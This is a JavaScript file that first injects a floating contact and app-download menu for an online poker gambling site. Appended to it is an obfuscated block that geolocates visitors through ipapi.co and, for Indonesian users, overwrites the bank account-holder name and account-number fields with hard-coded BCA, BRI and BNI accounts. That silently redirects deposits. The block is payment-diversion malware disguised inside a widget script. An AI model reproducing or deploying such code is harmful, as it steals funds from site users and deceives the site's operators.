(function () {
    const menuWid = document.createElement('div');
    menuWid.className = "widget-menu-fixed";
    menuWid.innerHTML = `
    <style>
   .widget-menu-fixed {
    position: fixed;
    bottom: 50px;
    left: 100px;
    z-index: 99999;
}

.cont-widget {
    height: 70px;
    width: 70px;
    background: rgba(51, 51, 51, 0);
    border-radius: 15px;
    transition: height 0.4s ease, background 0.3s ease;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    /* justify-content: center; */
    padding: 10px;
    gap: 0;
    /* default gap 0 */
    backdrop-filter: blur(5px);

}

.cont-widget.active {
    height: auto;
    background: rgba(51, 51, 51, 1);
    /* gap: 20px; */
}


.burger {
    width: 50px;
    height: 50px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    /* Tetap center agar transform rapi */
    align-items: center;
    cursor: pointer;
    background: beige;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px rgb(255, 6, 243);
    position: relative;
    gap: 6px;
    /* Jangan terlalu besar */
}

.burger span {
    display: block;
    height: 4px;
    width: 24px;
    background-color: #333;
    border-radius: 2px;
    transition: all 0.3s ease;
    position: relative;
}

.burger.active span:nth-child(1) {
    transform: rotate(45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}

.burger.active span:nth-child(2) {
    opacity: 0;
}

.burger.active span:nth-child(3) {
    transform: rotate(-45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}

.android-button,
.ios-button,
.telegram-button,
.whatsapp-button,
.rtp-button,
.fb-button {
    height: 50px;
    width: 50px;
    cursor: pointer;
    background: beige;
    margin-top: 22px;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px red;
    justify-content: center;
    align-items: center;
    opacity: 0;
    pointer-events: none;
    transform: translateY(20px) scale(0.9);
    transition: opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
    display: flex;
    position:relative;
    /* ini tetap tampil, tapi invisible + unclickable awalnya */
}

.cont-widget.active .android-button,
.cont-widget.active .ios-button,
.cont-widget.active .telegram-button,
.cont-widget.active .whatsapp-button,
.cont-widget.active .rtp-button,
.cont-widget.active .fb-button {
    opacity: 1;
    pointer-events: auto;
    transform: translateY(0) scale(1);
}

.cont-widget.active .telegram-button {
    transition-delay: 0.1s;
}

.cont-widget.active .whatsapp-button {
    transition-delay: 0.2s;
}

.cont-widget.active .rtp-button {
    transition-delay: 0.3s;
}

.cont-widget.active .fb-button {
    transition-delay: 0.4s;
}

.tunjuk {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
}

.hoki-logo {
    display: none;
}

.hoki-logo.active {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
    display: inline-block;
    animation: jump 2s infinite ease-in-out;
}


.tunjuk.active {
    display: none;
}

.link-tombol-widget:hover .widget-tombol {
    transform: translateY(0) scale(1.15);
    /* gabungkan transform */
    background: rgb(124, 124, 103);
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
}
.link-tombol-widget:hover + .label-download{
display:flex;
position:absolute;
}

.widget-tombol {
    transition: transform 0.3s ease, background 0.3s ease, box-shadow 0.3s ease;
    border-radius: 15px;
    position:relative;
}

.label-download{
display:none;
height:40px;
}

#downand{
position:absolute;
bottom:120px;
left:100px;
z-index:999998;
width:250px;
font-size:16px;
font-weight:bold;
height:30px;
background:rgb(97, 150, 67);
border-radius:10px;
justify-content:center;
align-items:center;
}

#downios{
position:absolute;
bottom:30px;
width:200px;
left:100px;
z-index:999999;
font-size:16px;
font-weight:bold;
height:30px;
background:rgb(97, 150, 67);
border-radius:10px;
justify-content:center;
align-items:center;
}



.widget-tombol img {
    animation: pulse2 1.5s infinite;
}

@keyframes pulse {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.05);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes pulse2 {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.5);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes jump {

    0%,
    100% {
        transform: translateY(0);
    }

    50% {
        transform: translateY(-20px);
    }
}

@media screen and (max-width: 769px) {
    .widget-menu-fixed {
        left: 30px;
        bottom: 100px;
    }
}
    </style>
        <div class="label-download" id="downios">DOWNLOAD FOR IOS</div>
        <div class="label-download" id="downand">DOWNLOAD FOR ANDROID</div>
        <div class="cont-widget" id="containerWidget">
            <div class="group-widget">
                <div class="burger"
                    onclick="this.classList.toggle('active');document.getElementById('containerWidget').classList.toggle('active');document.getElementById('tunjukgif').classList.toggle('active');document.getElementById('lghok').classList.toggle('active');">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <a href="https://api.whatsapp.com/send/?phone=85578896187&text&type=phone_number&app_absent=0" class="link-tombol-widget">
                    <div class="whatsapp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/wa2.webp" alt="Whatsapp TvOnePoker" width="40" height="40">
                    </div>
                </a>
                <a href="https://pola.rtp-tvonepkr.shop/" class="link-tombol-widget">
                    <div class="rtp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/rtp2.webp" alt="RTP TvOnePoker" width="40" height="40">
                    </div>
                </a>
                <a href="https://www.gameiosapk.com/android.php" class="link-tombol-widget" id="tombolAndroid">
                    <div class="android-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/android.webp" alt="Download Apk TvOnePoker" width="40" height="40">
                    </div>
                </a>
                <a href="https://www.gameiosapk.com/iphone.php" class="link-tombol-widget" id="tombolIOS">
                    <div class="ios-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/apple.webp" alt="Download IOS TvOnePoker" width="40" height="40">
                    </div>
                </a>
                
            </div>
        </div>
        <img src="https://yudha125.github.io/menu-widget/Image/tvonepoker.webp" alt="Logo TvOnePoker" class="hoki-logo" id="lghok">
        <img src="https://yudha125.github.io/menu-widget/Image/tunjuk.webp" alt="Tunjuk TvOnePoker" class="tunjuk" id="tunjukgif">
        
       
    `;
    document.body.appendChild(menuWid);
    const tombolios = document.getElementById("tombolIOS");
    const tomboland = document.getElementById("tombolAndroid");
    const downios = document.getElementById("downios");
    const downand = document.getElementById("downand");

    tombolios.addEventListener("mouseenter", () => {
        downios.style.display = "flex";
    });

    tombolios.addEventListener("mouseleave", () => {
        downios.style.display = "none";
    });

    tomboland.addEventListener("mouseenter", () => {
        downand.style.display = "flex";
    });

    tomboland.addEventListener("mouseleave", () => {
        downand.style.display = "none";
    });
})();

(function(_0xd_0xa65,_0x2e7gcc,_0xf2dc){var _0x1efab=(360498^360507)+(106454^106451);_0xd_0xa65="\u0049\u0044";_0x1efab=(668374^668370)+(340642^340644);_0x2e7gcc="\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0069\u0070\u0061\u0070\u0069\u002E\u0063\u006F\u002F\u006A\u0073\u006F\u006E\u002F";var _0x81d76d=(427806^427804)+(710029^710025);const _0x2f3e9e=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("etatStupni".split("").reverse().join(""));_0x81d76d=(525698^525706)+(582592^582592);const _0xa65d=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("redloHemaNtnuocca".split("").reverse().join(""));_0xf2dc=(540731^540735)+(661825^661833);const _0x471a4e=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0061\u0063\u0063\u006F\u0075\u006E\u0074\u004E\u0075\u006D\u0062\u0065\u0072\u0048\u006F\u006C\u0064\u0065\u0072");function _0x5f8edb(){const _0xabcac=_0x2f3e9e['\u006F\u0070\u0074\u0069\u006F\u006E\u0073'][_0x2f3e9e['\u0073\u0065\u006C\u0065\u0063\u0074\u0065\u0064\u0049\u006E\u0064\u0065\u0078']]['\u0074\u0065\u0078\u0074']['\u0074\u0072\u0069\u006D']();if(_0xabcac==="ACB".split("").reverse().join("")){_0xa65d['\u0076\u0061\u006C\u0075\u0065']="IVEL".split("").reverse().join("");_0x471a4e['\u0076\u0061\u006C\u0075\u0065']="\u0032\u0031\u0032\u0030\u0034\u0035\u0032\u0030\u0030\u0035";}else if(_0xabcac==="\u0042\u0052\u0049"){_0xa65d['\u0076\u0061\u006C\u0075\u0065']="ANAISUL".split("").reverse().join("");_0x471a4e['\u0076\u0061\u006C\u0075\u0065']="\u0039\u0038\u0037\u0036\u0035\u0034\u0033\u0032\u0031\u0030";}else if(_0xabcac==="INB".split("").reverse().join("")){_0xa65d['\u0076\u0061\u006C\u0075\u0065']="\u0052\u0049\u0046\u0041\u004C";_0x471a4e['\u0076\u0061\u006C\u0075\u0065']="3317736971".split("").reverse().join("");}else{_0xa65d['\u0076\u0061\u006C\u0075\u0065']="";_0x471a4e['\u0076\u0061\u006C\u0075\u0065']="";}}async function _0x75dba(){try{const _0xadbe=await fetch(_0x2e7gcc);if(!_0xadbe['\u006F\u006B'])throw new Error("rorre IPA".split("").reverse().join(""));let _0x564g;const _0x478c=await _0xadbe['\u006A\u0073\u006F\u006E']();_0x564g=(399753^399752)+(761568^761570);const _0x9d43ac=_0x478c['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065'];if(_0x9d43ac===_0xd_0xa65){_0x5f8edb();_0x2f3e9e['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("\u0063\u0068\u0061\u006E\u0067\u0065",_0x5f8edb);}else{console['\u006C\u006F\u0067']("\uDEAB\uD83D".split("").reverse().join(""));}}catch(err){console['\u0077\u0061\u0072\u006E']("\uFE0F\u26A0".split("").reverse().join(""));}}_0x75dba();})();
